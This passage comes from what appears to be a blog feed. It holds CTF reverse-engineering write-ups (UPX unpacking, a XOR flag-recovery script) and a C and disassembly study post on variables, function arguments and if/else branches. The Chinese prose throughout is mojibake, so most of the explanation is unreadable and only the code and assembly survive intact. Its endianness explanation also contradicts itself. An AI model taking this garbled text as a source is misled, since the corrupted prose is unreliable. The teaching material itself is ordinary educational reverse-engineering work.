&quot;);    printf(&quot;%x\n&quot;, hash);    return 0;}</code></pre></div><p>æ‹¿åˆ°flagï¼š<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733900988974.jpg" srcset="/img/loading.gif" alt="-w603"></p><h2 id="simple-unpack"><a href="#simple-unpack" class="headerlink" title="simple-unpack"></a>simple-unpack</h2><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>è¿™ä¸ªçœ‹é¢˜ç›®å°±æ˜¯çŸ¥é“åŠ äº†å£³ã€‚ä¸”æ˜¯ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸¢è¿›edbçœ‹ä¸€ä¸‹ã€‚<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733910805939.jpg" srcset="/img/loading.gif" alt="-w685"></p><p>å•æ­¥è°ƒè¯•èµ°ä¸€ä¼šï¼Œåœ¨å¯„å­˜å™¨çª—å£çœ‹åˆ°ï¼š<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733910639998.jpg" srcset="/img/loading.gif" alt="-w1019"><br>è¿™å¾ˆæ˜æ˜¾æ˜¯åŠ äº†UPXå£³ã€‚</p><h3 id="è„±å£³"><a href="#è„±å£³" class="headerlink" title="è„±å£³"></a>è„±å£³</h3><p><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733911418603.jpg" srcset="/img/loading.gif" alt="-w733"><br>è¿™é‡Œå°±ç”¨<code>upx -d</code>ç›´æ¥ä¸€é”®è„±å£³ã€‚ä»¥åå¯ä»¥ç»ƒä¹ æ‰‹åŠ¨è„±upxå£³ã€‚<br>è„±å£³å®Œæˆåç”¨IDAè¿›è¡Œåˆ†æï¼š</p><h3 id="IDAé™æ€åˆ†æ-1"><a href="#IDAé™æ€åˆ†æ-1" class="headerlink" title="IDAé™æ€åˆ†æ"></a>IDAé™æ€åˆ†æ</h3><p><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733913704154.jpg" srcset="/img/loading.gif" alt="-w617"><br>æ‰“å¼€ç›´æ¥å‡ºç°äº†flagï¼Œè¿™ä¸ªé¢˜å°±è€ƒä¸ªè¯†åˆ«å£³å’Œupxè„±å£³äº†ã€‚</p><h2 id="logmein"><a href="#logmein" class="headerlink" title="logmein"></a>logmein</h2><p><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15741646328276.jpg" srcset="/img/loading.gif" alt="-w569"><br>å…ˆæŸ¥çœ‹ä¸€ä¸‹ï¼Œæ— å£³ï¼Œelf 64ä½åº”ç”¨ã€‚</p><h3 id="IDAé™æ€åˆ†æ-2"><a href="#IDAé™æ€åˆ†æ-2" class="headerlink" title="IDAé™æ€åˆ†æ"></a>IDAé™æ€åˆ†æ</h3><p><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15741650120350.jpg" srcset="/img/loading.gif" alt="-w442"><br>ç‚¹å‡»æ­¤å¤„å‡ºç°äº†ï¼š<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15741650432513.jpg" srcset="/img/loading.gif" alt="-w493"><br>ç¡®è®¤å…³é”®ä»£ç æ®µã€‚å¼€å§‹å¯¹è¿™ä¸ªå¾ªç¯è¿›è¡Œåˆ†æï¼Œéœ€è¦å¯¹v8 v7 v9é‡ç‚¹åˆ†æã€‚<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15741657131708.jpg" srcset="/img/loading.gif" alt="-w1026"><br>è¿™é‡Œé¢éš¾ç‚¹å°±åœ¨å¦‚ä½•å¯¹v8çš„ç†è§£ã€‚</p><h3 id="v8ä¸å…³é”®åŠ å¯†åˆ†æ"><a href="#v8ä¸å…³é”®åŠ å¯†åˆ†æ" class="headerlink" title="v8ä¸å…³é”®åŠ å¯†åˆ†æ"></a>v8ä¸å…³é”®åŠ å¯†åˆ†æ</h3><p>v8æ˜¯ä¸€ä¸ª_int64ä¹Ÿå°±æ˜¯long longç±»å‹çš„æ•°å€¼ï¼Œå…¶å­˜å…¥å†…å­˜éœ€è¦å˜æˆ16è¿›åˆ¶çš„æ•°å€¼å­˜å…¥ã€‚<img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15741666120370.jpg" srcset="/img/loading.gif" alt="-w496"><br>åˆšåˆšæˆ‘ä»¬æ³¨æ„åˆ°è¿™ä¸ªx86æ¡†æ¶x64çš„ç¨‹åºï¼Œå…¶åœ¨å†…å­˜æ˜¯ç”¨å°ç«¯åºå­˜å…¥çš„ï¼Œä¹Ÿå°±æ˜¯åœ°å€é«˜ä½æ”¾æ•°å€¼é«˜ä½ï¼Œåœ°å€ä½ä½æ”¾åœ°å€ä½ä½ã€‚é‚£ä¹ˆå…¶æ”¾å¥½å°±æ˜¯<img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15741662400799.jpg" srcset="/img/loading.gif" alt="-w226"><br>æ­£å¥½æ˜¯åè¿‡æ¥çš„ã€‚<br>ç„¶ååˆ†æä¸€ä¸‹åŠ å¯†ä»£ç ï¼Œè¿™ä¸»è¦å°±æ˜¯æŒ‡é’ˆçŸ¥è¯†äº†ï¼š<br><code>v4 = (unsigned int)(char)(*((_BYTE *)&amp;v8 + i % v7) ^ v9[i]);</code><br>è¿™é‡Œçš„ï¼ˆcharï¼‰æ˜¯ç»™long longå¼ºåˆ¶è½¬å‹ï¼Œç„¶åä¸ºäº†åé¢çš„ä»¥2ä½16è¿›åˆ¶æ•°ä¹Ÿå°±æ˜¯ä¸€ä¸ªå­—èŠ‚ï¼Œæ¥è¯»å–æ•°å€¼ã€‚<code>i % v7</code>å…¶æ˜¯å°±æ˜¯æ§åˆ¶i = 0â€”6æ­£å¥½æŠŠè¿™ä¸ªv8ç»™æ­£ç¡®è¯»å–å®Œã€‚ç„¶åä¸€ä½ä½å–å®Œv8åå¼€å§‹è·Ÿv9å¼‚æˆ–ã€‚</p><h3 id="è„šæœ¬è§£å¯†"><a href="#è„šæœ¬è§£å¯†" class="headerlink" title="è„šæœ¬è§£å¯†"></a>è„šæœ¬è§£å¯†</h3><div class="hljs"><pre><code>#include &lt;iostream&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main() {    int v6;    char v7[]=&quot;harambe&quot;;    v6 = 7;    char v8[18];    strcpy(v8, &quot;:\&quot;AL_RT^L*.?+6/46&quot;);    char s[18];    int i;    for ( i = 0; i &lt; strlen(v8); ++i) {        s[i] =v7[i%v6]^v8[i];    }    for (int j = 0; j &lt; strlen(v8); ++j) {        printf(&quot;%c&quot;,s[j]);    }    return 0;}</code></pre></div><p><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15741669073968.jpg" srcset="/img/loading.gif" alt="-w402"></p><h3 id="å¯¹äºå¤§å°ç«¯åºçš„çŸ¥è¯†è¡¥å……"><a href="#å¯¹äºå¤§å°ç«¯åºçš„çŸ¥è¯†è¡¥å……" class="headerlink" title="å¯¹äºå¤§å°ç«¯åºçš„çŸ¥è¯†è¡¥å……"></a>å¯¹äºå¤§å°ç«¯åºçš„çŸ¥è¯†è¡¥å……</h3><p><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15741673443772.jpg" srcset="/img/loading.gif" alt="-w718"><br>æ•°æ®ç±»å‹ä¸ºå­—èŠ‚å‹( BYTE)æ—¶ï¼Œå…¶é•¿åº¦ä¸º1ä¸ªå­—èŠ‚,ä¿å­˜è¿™æ ·çš„æ•°æ®æ—¶ï¼Œæ— è®ºé‡‡ç”¨å¤§ç«¯åºè¿˜æ˜¯å°ç«¯åºï¼Œå­—èŠ‚é¡ºåºéƒ½æ˜¯ä¸€æ ·çš„ã€‚<strong>ä½†æ˜¯æ•°æ®é•¿åº¦ä¸º2ä¸ªå­—èŠ‚ä»¥ä¸Š(å«2ä¸ªå­—èŠ‚)æ—¶ï¼Œé‡‡ç”¨ä¸åŒå­—èŠ‚åºä¿å­˜å®ƒä»¬å½¢æˆçš„å­˜å‚¨é¡ºåºæ˜¯ä¸åŒçš„ã€‚é‡‡ç”¨å¤§ç«¯åºå­˜å‚¨æ•°æ®æ—¶ï¼Œå†…å­˜åœ°å€ä½ä½å­˜å‚¨æ•°æ®çš„é«˜ä½ï¼Œå†…å­˜åœ°å€é«˜ä½å­˜å‚¨æ•°æ®çš„ä½ä½ï¼Œè¿™æ˜¯ä¸€ç§æœ€ç›´è§‚çš„å­—èŠ‚å­˜å‚¨é¡ºåº;é‡‡ç”¨å°ç«¯åºå­˜å‚¨æ•°æ®æ—¶,åœ°å€é«˜ä½å­˜å‚¨æ•°æ®çš„é«˜ä½ï¼Œåœ°å€ä½ä½å­˜å‚¨æ•°æ®çš„ä½ä½ï¼Œè¿™æ˜¯ä¸€ç§é€†åºå­˜å‚¨æ–¹å¼ï¼Œä¿å­˜çš„å­—èŠ‚é¡ºåºè¢«å€’è½¬ï¼Œå®ƒæ˜¯æœ€ç¬¦åˆäººç±»æ€ç»´çš„å­—èŠ‚åºã€‚</strong></p><p><strong>å¼ºè°ƒ</strong>ï¼šåªæœ‰æ•°æ®é•¿åº¦åœ¨2ä¸ªå­—èŠ‚ä»¥ä¸Šæ—¶ï¼Œå³æ•°æ®ä¸ºå¤šå­—èŠ‚æ•°æ®æ—¶ï¼Œé€‰ç”¨å¤§ç«¯åºè¿˜æ˜¯å°ç«¯åºä¼šå¯¼è‡´æ•°æ®çš„å­˜å‚¨é¡ºåºä¸åŒã€‚å­—ç¬¦ä¸²â€œabcdeâ€ è¢«ä¿å­˜åœ¨ä¸€ä¸ªå­—ç¬¦ ( Char )æ•°ç»„strä¸­,å­—ç¬¦æ•°ç»„åœ¨å†…å­˜ä¸­æ˜¯è¿ç»­çš„ï¼Œæ­¤æ—¶å‘å­—ç¬¦æ•°ç»„å­˜æ”¾æ•°æ®ï¼Œæ— è®ºé‡‡ç”¨å¤§ç«¯åºè¿˜æ˜¯å°ç«¯åºï¼Œå­˜å‚¨é¡ºåºéƒ½ç›¸åŒã€‚</p><h2 id="insanity"><a href="#insanity" class="headerlink" title="insanity"></a>insanity</h2><p><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15741680757822.jpg" srcset="/img/loading.gif" alt="-w764"><br>è¿™ä¸ªæ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œä¸»å‡½æ•°ç‚¹å‡»ä¸€ä¸‹ä»–è¦æ‰“å°çš„å­—ç¬¦ä¸²å°±å¯ä»¥çœ‹åˆ°äº†flagï¼Œå½“ç„¶shift + f12ä¹Ÿæ˜¯å¯ä»¥çœ‹åˆ°ã€‚</p><h2 id="no-strings-attached"><a href="#no-strings-attached" class="headerlink" title="no-strings-attached"></a>no-strings-attached</h2><h2 id="csaw2013reversing2"><a href="#csaw2013reversing2" class="headerlink" title="csaw2013reversing2"></a>csaw2013reversing2</h2><h2 id="getit"><a href="#getit" class="headerlink" title="getit"></a>getit</h2><h2 id="python-trade"><a href="#python-trade" class="headerlink" title="python-trade"></a>python-trade</h2><h2 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h2>]]></content>
    
    
    
    <tags>
      
      <tag>Re</tag>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰</title>
    <link href="/2019/10/23/C%E8%AF%AD%E8%A8%80%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
    <url>/2019/10/23/C%E8%AF%AD%E8%A8%80%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%9B%9B%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰"><a href="#Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰" class="headerlink" title="Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰"></a>Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ¬æ¬¡ä¸»è¦å­¦ä¹ ä»¥ä¸‹å†…å®¹</p><ol><li>å†…å­˜å›¾</li><li>å…¨å±€å˜é‡ã€å±€éƒ¨å˜é‡</li><li>å‡½æ•°å‚æ•°çš„åˆ†æ</li><li>åˆ†æ”¯è¯­å¥:<code>if</code> <code>if...else...</code> <code>if..else if..else if....else</code>åˆ†æ”¯è¯­å¥çš„åµŒå¥—ä½¿ç”¨``çš„æ­£å‘ä¸é€†å‘åˆ†æ</li></ol><h2 id="å†…å­˜å›¾"><a href="#å†…å­˜å›¾" class="headerlink" title="å†…å­˜å›¾"></a>å†…å­˜å›¾</h2><p><img src="/2019/10/23/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰/images/15718432593875.jpg" srcset="/img/loading.gif" alt="-w301"><br>åœ¨ç”µè„‘ä¸­ä»»ä½•ä¸€ä¸ªç¨‹åºè¿è¡Œæ—¶ï¼Œå…¶ä¼šåœ¨å†…å­˜ä¸­åˆ†æˆä»¥ä¸Šå›¾ä¸­çš„å‡ ä¸ªåŒºåŸŸã€‚è¯¦ç»†æ¯ä¸ªåŒºæ˜¯æ€ä¹ˆæ ·çš„ï¼Œç›´æ¥çœ‹å›¾å³å¯ã€‚</p><h2 id="å…¨å±€å˜é‡ã€å±€éƒ¨å˜é‡"><a href="#å…¨å±€å˜é‡ã€å±€éƒ¨å˜é‡" class="headerlink" title="å…¨å±€å˜é‡ã€å±€éƒ¨å˜é‡"></a>å…¨å±€å˜é‡ã€å±€éƒ¨å˜é‡</h2><div class="hljs"><pre><code>int g_n = 10; //å…¨å±€å˜é‡int Funcation() //ä»£ç åŒºï¼Œè°ƒç”¨æ—¶æ‰§è¡Œ{    int x = 1;//å±€éƒ¨å˜é‡    int y = 3;    return g_n+x+y;    }}</code></pre></div><p>å°±ç”¨è¿™ä¸ªä»£ç æ®µæ¥åˆ†æã€‚</p><h3 id="å…¨å±€å˜é‡çš„ç‰¹ç‚¹"><a href="#å…¨å±€å˜é‡çš„ç‰¹ç‚¹" class="headerlink" title="å…¨å±€å˜é‡çš„ç‰¹ç‚¹"></a>å…¨å±€å˜é‡çš„ç‰¹ç‚¹</h3><p>1ã€å…¨å±€å˜é‡åœ¨ç¨‹åºç¼–è¯‘å®Œæˆååœ°å€å°±å·²ç»ç¡®å®šä¸‹æ¥äº†ï¼Œ<strong>åªè¦ç¨‹åºå¯åŠ¨ï¼Œå…¨å±€å˜é‡å°±å·²ç»å­˜åœ¨äº†</strong>ï¼Œå¯åŠ¨åé‡Œé¢æ˜¯å¦æœ‰å€¼å–å†³äºå£°æ˜æ—¶æ˜¯å¦ç»™å®šäº†åˆå§‹å€¼ï¼Œå¦‚æœæ²¡æœ‰ï¼Œé»˜è®¤ä¸º0ã€‚<br>2ã€å…¨å±€å˜é‡çš„å€¼å¯ä»¥è¢«æ‰€æœ‰å‡½æ•°æ‰€ä¿®æ”¹ï¼Œé‡Œé¢å­˜å‚¨çš„æ˜¯æœ€åä¸€æ¬¡ä¿®æ”¹çš„å€¼.<br>3ã€å…¨å±€å˜é‡æ‰€å å†…å­˜ä¼šä¸€ç›´å­˜åœ¨ï¼ŒçŸ¥é“æ•´ä¸ªè¿›ç¨‹ç»“æŸ.<br>4ã€å…¨å±€å˜é‡çš„åæ±‡ç¼–è¯†åˆ«ï¼š<code>MOV å¯„å­˜å™¨,byte/word/dword ptr ds:[0x12345678]</code><br>é€šè¿‡å¯„å­˜å™¨çš„å®½åº¦ï¼Œæˆ–è€…byte/word/dword æ¥åˆ¤æ–­å…¨å±€å˜é‡çš„å®½åº¦.<strong>å…¨å±€å˜é‡å°±æ˜¯æ‰€è°“çš„åŸºå€</strong>ã€‚</p><h3 id="å±€éƒ¨å˜é‡çš„ç‰¹ç‚¹"><a href="#å±€éƒ¨å˜é‡çš„ç‰¹ç‚¹" class="headerlink" title="å±€éƒ¨å˜é‡çš„ç‰¹ç‚¹"></a>å±€éƒ¨å˜é‡çš„ç‰¹ç‚¹</h3><p>1ã€å±€éƒ¨å˜é‡åœ¨ç¨‹åºç¼–è¯‘å®Œæˆåå¹¶æ²¡æœ‰åˆ†é…å›ºå®šçš„åœ°å€.ï¼ˆå› ä¸ºè®¡ç®—æœºä¸çŸ¥é“ä»€ä¹ˆæ—¶å€™ä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥ä¸ä¼šæå‰åˆ†é…å¥½ï¼‰<br>2ã€åœ¨æ‰€å±çš„æ–¹æ³•æ²¡æœ‰è¢«è°ƒç”¨æ—¶ï¼Œå±€éƒ¨å˜é‡å¹¶ä¸ä¼šåˆ†é…å†…å­˜åœ°å€ï¼Œåªæœ‰å½“æ‰€å±çš„ç¨‹åºè¢«è°ƒç”¨äº†ï¼Œæ‰ä¼šåœ¨å †æ ˆä¸­åˆ†é…å†…å­˜.<br>3ã€å½“å±€éƒ¨å˜é‡æ‰€å±çš„å‡½æ•°æ‰§è¡Œå®Œæ¯•åï¼Œå±€éƒ¨å˜é‡æ‰€å ç”¨çš„å†…å­˜å°†å˜æˆåƒåœ¾æ•°æ®.å±€éƒ¨å˜é‡æ¶ˆå¤±.<br>4ã€å±€éƒ¨å˜é‡åªèƒ½åœ¨å‡½æ•°å†…éƒ¨ä½¿ç”¨ï¼Œå‡½æ•°Aæ— æ³•ä½¿ç”¨å‡½æ•°Bçš„å±€éƒ¨å˜é‡.ï¼ˆä»å †æ ˆå›¾ä¸­ä¹Ÿå¯ä»¥æƒ³è±¡çš„åˆ°åŸç†ï¼‰<br>5ã€å±€éƒ¨å˜é‡çš„åæ±‡ç¼–è¯†åˆ«ï¼š<code>[ebp-4]</code>[ebp-8]<code>[ebp-0xC]</code>ç­‰ç­‰ç±»ä¼¼çš„æƒ…å½¢ã€‚</p><h2 id="å‡½æ•°å‚æ•°çš„åˆ†æ"><a href="#å‡½æ•°å‚æ•°çš„åˆ†æ" class="headerlink" title="å‡½æ•°å‚æ•°çš„åˆ†æ"></a>å‡½æ•°å‚æ•°çš„åˆ†æ</h2><p>å¦‚ä½•åˆ¤æ–­å‡½æ•°æœ‰å‡ ä¸ªå‚æ•°ï¼Œå·²ç»åˆ†åˆ«æ˜¯ä»€ä¹ˆï¼Ÿ</p><p>ä¸€èˆ¬æƒ…å†µï¼š<br>    æ­¥éª¤ä¸€ï¼šè§‚å¯Ÿè°ƒç”¨å¤„çš„ä»£ç <br>    push    3<br>    push    2<br>    push    1<br>    call    0040100f</p><p>æ­¥éª¤äºŒï¼šæ‰¾åˆ°å¹³è¡¡å †æ ˆçš„ä»£ç ç»§ç»­è®ºè¯</p><div class="hljs"><pre><code>call    0040100fadd     esp,0Ch</code></pre></div><p>æˆ–è€…å‡½æ•°å†…éƒ¨</p><div class="hljs"><pre><code>ret 4/8/0xC/0x10</code></pre></div><p>æœ€åï¼Œä¸¤è€…ä¸€ç»¼åˆï¼Œå‡½æ•°çš„å‚æ•°ä¸ªæ•°åŸºæœ¬ç¡®å®š.å¯ä»¥åº”å¯¹ç™¾åˆ†ä¹‹å…«åçš„æƒ…å†µã€‚</p><p>ä½†å‰©ä¸‹çš„ç™¾åˆ†ä¹‹äºŒåå‘¢ï¼Ÿ<br>ä¸Šé¢çš„åˆ†æå­˜åœ¨çš„é—®é¢˜ï¼š<br>1ã€<strong>å‚æ•°ä¼ é€’æœªå¿…éƒ½æ˜¯é€šè¿‡å †æ ˆï¼Œè¿˜å¯èƒ½é€šè¿‡ä½¿ç”¨å¯„å­˜å™¨</strong>.<br>ä¾‹ï¼š</p><div class="hljs"><pre><code>push ebxpush eaxmov ecx,dword ptr ds:[esi]mov edx,dword ptr ds:[edi]push 45push 33call å‡½æ•°åœ°å€</code></pre></div><p>2ã€<strong>å‡½æ•°è°ƒç”¨å¤„çš„ä»£ç æ— æ³•æŸ¥çœ‹.</strong><br>ä¾‹ï¼š<br>è¿›å…¥å‡½æ•°æŸ¥çœ‹æ±‡ç¼–ä»£ç ï¼š</p><div class="hljs"><pre><code>00401050   push         ebp00401051   mov         ebp,esp00401053   sub         esp,48h00401056   push        ebx00401057   push        esi00401058   push        edi    00401059   push        ecx    0040105A   lea         edi,[ebp-48h]0040105D   mov         ecx,12h00401062   mov         eax,0CCCCCCCCh00401067   rep stos    dword ptr [edi]00401069   pop         ecx    0040106A   mov         dword ptr [ebp-8],edx0040106D   mov         dword ptr [ebp-4],ecx00401070   mov         eax,dword ptr [ebp-4]00401073   add         eax,dword ptr [ebp-8]00401076   add         eax,dword ptr [ebp+8]00401079   mov         [g_x (00427958)],eax0040107E   pop         edi    0040107F   pop         esi    00401080   pop         ebx    00401081   mov         esp,ebp00401083   pop         ebp    00401084   ret         4        </code></pre></div><p>è§‚å¯Ÿæ­¥éª¤ï¼š<br>1ã€ä¸è€ƒè™‘ebpã€esp<br>2ã€åªæ‰¾ç»™åˆ«äººèµ‹å€¼çš„å¯„å­˜å™¨<br>eax/ecx/edx/ebx/esi/edi<br>3ã€æ‰¾åˆ°ä»¥åè¿½æŸ¥å…¶æ¥æºï¼Œå¦‚æœï¼Œè¯¥å¯„å­˜å™¨ä¸­çš„å€¼ï¼Œä¸æ˜¯åœ¨å‡½æ•°å†…å­˜èµ‹å€¼çš„ï¼Œé‚£ä¸€å®šæ˜¯ä¼ è¿›æ¥çš„å‚æ•°.<br>**å…¬å¼ä¸€ï¼šå¯„å­˜å™¨ + ret 4\8\0C = å‚æ•°ä¸ªæ•°<br>å…¬å¼äºŒï¼šå¯„å­˜å™¨ + [ebp+8]+[ebp+0x] = å‚æ•°ä¸ªæ•°**<br>è¿™ä¸¤ä¸ªå…¬å¼å¯ä»¥äº’ç›¸ç»“åˆéªŒè¯çœ‹æ˜¯å¦ç®—çš„å¯¹ã€‚<br>å¦‚ä»¥ä¸Šä»£ç æ®µï¼Œåªå¯ä»¥æ‰¾åˆ°<code>edi,ecx,edx</code>ç»™åˆ«äººèµ‹å€¼ï¼Œä½†æ˜¯å…¶ä¸­<code>edi ecx</code>éƒ½æ˜¯å‡½æ•°å†…å­˜èµ‹çš„å€¼ï¼Œæ‰€ä»¥åªå‰©ä¸‹<code>edx</code>ï¼Œåœ¨åŠ ä¸Šæœ€åçš„<code>ret 4</code>ï¼ˆè¿™ä¸ªè‚¯å®šæ˜¯pushè¿›æ¥äº†ä¸€ä¸ªå‚æ•°ï¼‰å°±ç­‰äº2ï¼Œä¹Ÿå°±æ˜¯2ä¸ªå‚æ•°ã€‚ä¸å…¬å¼äºŒæ£€éªŒå‘ç°æ²¡é—®é¢˜ï¼Œ<code>[ebp+0x]</code>ç±»ä¼¼çš„åªå‡ºç°ä¸€ä¸ª.</p><h2 id="åˆ†æ”¯è¯­å¥"><a href="#åˆ†æ”¯è¯­å¥" class="headerlink" title="åˆ†æ”¯è¯­å¥"></a>åˆ†æ”¯è¯­å¥</h2><h3 id="æ­£å‘ä»£ç ç»ƒä¹ "><a href="#æ­£å‘ä»£ç ç»ƒä¹ " class="headerlink" title="æ­£å‘ä»£ç ç»ƒä¹ "></a>æ­£å‘ä»£ç ç»ƒä¹ </h3><p> ç»ƒä¹ 1:å®šä¹‰4ä¸ªintç±»å‹çš„å…¨å±€å˜é‡ï¼Œåˆ†åˆ«æ˜¯g_x,g_y,g_z,g_r,ä½¿ç”¨if..else..åˆ†æ”¯è¯­å¥ï¼Œå°†æœ€å¤§çš„å€¼å­˜å‚¨åˆ°g_rä¸­ã€‚<br>    #include â€œstdafx.hâ€<br>    int g_x = 5;<br>    int g_y = 3;<br>    int g_z = 7;<br>    int g_r = 0;<br>    void getMax()<br>    {<br>        if(g_x&gt;g_y)<br>        {<br>            if (g_x&gt;g_z)<br>            {<br>                g_r=g_x;<br>            }<br>            else{<br>                    g_r=g_z;<br>                }<br>        }<br>        else if (g_y &gt; g_z)<br>        {<br>            g_r=g_y;<br>        }<br>        else g_r=g_z;<br>        printf(â€œ%d\nâ€,g_r);<br>    }<br>    int main(int argc, char* argv[])<br>    {<br>        getMax();<br>        return 0;<br>    }</p><p>ç»ƒä¹ 2:æ‰¾å‡ºæ•°ç»„é‡Œé¢æœ€å¤§çš„å€¼ï¼Œå¹¶å­˜å‚¨åˆ°å…¨å±€å˜é‡ä¸­<br>    <img src="/2019/10/23/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰/images/15719199995620.jpg" srcset="/img/loading.gif" alt="-w238"><br>    #include â€œstdafx.hâ€<br>    int a[4] = {2,5,7,9};<br>    int g_r = 0;<br>    void getMax()<br>    {<br>        if(a[0]&gt;a[1])<br>        {<br>            if (a[0]&gt;a[2])<br>            {<br>                if (a[0]&gt;a[3])<br>                {<br>                    g_r=a[0];<br>                }<br>                else g_r=a[3];<br>            }<br>            else if(a[2]&gt;a[3]){<br>                    g_r=a[2];<br>                }<br>                else g_r=a[3];<br>        }<br>        else if (a[1] &gt; a[2])<br>        {<br>            if (a[1]&gt;a[3])<br>            {<br>                g_r=a[1];<br>            }<br>            else g_r=a[3];<br>        }<br>        else if (a[2] &gt; a[3])<br>        {<br>            g_r=a[2];<br>        }<br>        else g_r=a[3];<br>        printf(â€œ%d\nâ€,g_r);<br>    }<br>    int main(int argc, char* argv[])<br>    {<br>        getMax();<br>        return 0;<br>    }</p><h4 id="æ„Ÿæ‚Ÿ"><a href="#æ„Ÿæ‚Ÿ" class="headerlink" title="æ„Ÿæ‚Ÿ"></a>æ„Ÿæ‚Ÿ</h4><p>1ï¼šåˆ†æ”¯è¯­å¥ä¸­if else,åŠå…¶ç›¸äº’å¥—ç”¨ï¼Œè¦çŸ¥é“å½“æŸä¸ªæ¡ä»¶æˆåŠŸåï¼Œæ‰§è¡Œå…¶ä¸­çš„ä»£ç ï¼Œç„¶åä»¥åäºå®ƒçš„ä»£ç éƒ½ä¸ä¼šå†è¿›è¡Œåˆ¤æ–­å’Œæ‰§è¡Œã€‚<br>2ï¼šä¸€ä¸ªifåªå¯¹åº”äºä¸€ä¸ªelseï¼Œelseåªèƒ½åœ¨ifåå‡ºç°ä¸å…¶æ­é…ä½¿ç”¨ã€‚</p><h3 id="é€†å‘åˆ†æ"><a href="#é€†å‘åˆ†æ" class="headerlink" title="é€†å‘åˆ†æ"></a>é€†å‘åˆ†æ</h3><h4 id="IFè¯­å¥é€†å‘åˆ†æ"><a href="#IFè¯­å¥é€†å‘åˆ†æ" class="headerlink" title="IFè¯­å¥é€†å‘åˆ†æ"></a>IFè¯­å¥é€†å‘åˆ†æ</h4><p>ç‰¹å¾è¯†åˆ«:é¦–å…ˆä¼šæœ‰ä¸€ä¸ªjxxæŒ‡ä»¤ç”¨äºå‘ä¸‹è·³è½¬ï¼Œä¸”è·³è½¬çš„ç›®çš„è¿‘endä¸­æ²¡æœ‰jmpæŒ‡ä»¤ã€‚æ ¹æ®ä»¥ä¸Šç‰¹å¾ï¼ŒæŠŠjxxæŒ‡ä»¤å–ååï¼Œå³å¯è¿˜åŸifè¯­å¥çš„ä»£ç ã€‚ï¼ˆ<strong>æˆ‘ä»¬è¦çŸ¥é“jccä»£ç è·³è½¬è¯­å¥ï¼Œå…¶åˆ¤æ–­æ¡ä»¶æ­£å¥½è·Ÿcçš„ifåˆ¤æ–­æ¡ä»¶æ˜¯æ­£å¥½åè¿‡æ¥çš„ã€‚</strong>ï¼‰<br><img src="/2019/10/23/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰/images/15719206938300.jpg" srcset="/img/loading.gif" alt="-w262"><br>æ±‡ç¼–ä»£ç ï¼š<br><img src="/2019/10/23/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰/images/15719208117580.jpg" srcset="/img/loading.gif" alt="-w331"><br>å¯¹äºè¿™æ®µä»£ç æˆ‘ä»¬é‡‡å–ä¸€å®šçš„åˆ†æé¡ºåºæ¥åˆ†æï¼š</p><ol><li>åˆ†æå‚æ•°ï¼š<code>[ebp+8] : X</code>        <code>[ebp+0Ch] :Y</code></li><li>åˆ†æå±€éƒ¨å˜é‡   æ— </li><li>åˆ†æå…¨å±€å˜é‡       <code>mov  dword ptr 004225c4,ecx</code></li><li>åŠŸèƒ½åˆ†æ:å°†å‚æ•°Xå­˜åˆ°åˆ°EAXä¸­ï¼Œç„¶åæ¯”è¾ƒEAX,ä¸å‚æ•°Yçš„å¤§å°.å¦‚æœX&lt;=Y é‚£ä¹ˆè·³è½¬åˆ°00401059çš„ä½ç½®,å¦åˆ™ï¼Œå°†Xçš„å€¼å­˜å‚¨åˆ°å…¨å±€å˜é‡ä¸­</li><li>è¿”å›å€¼åˆ†æ   æ— </li></ol><p>ç»ƒä¹ ï¼š<br><img src="/2019/10/23/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰/images/15719212740917.jpg" srcset="/img/loading.gif" alt="-w367"></p><ol><li>åˆ†æå‚æ•°ï¼š<code>[ebp+8] : X</code>        <code>[ebp+0Ch] :Y</code></li><li>åˆ†æå±€éƒ¨å˜é‡   <code>[ebp-4]ï¼ša</code></li><li>åˆ†æå…¨å±€å˜é‡       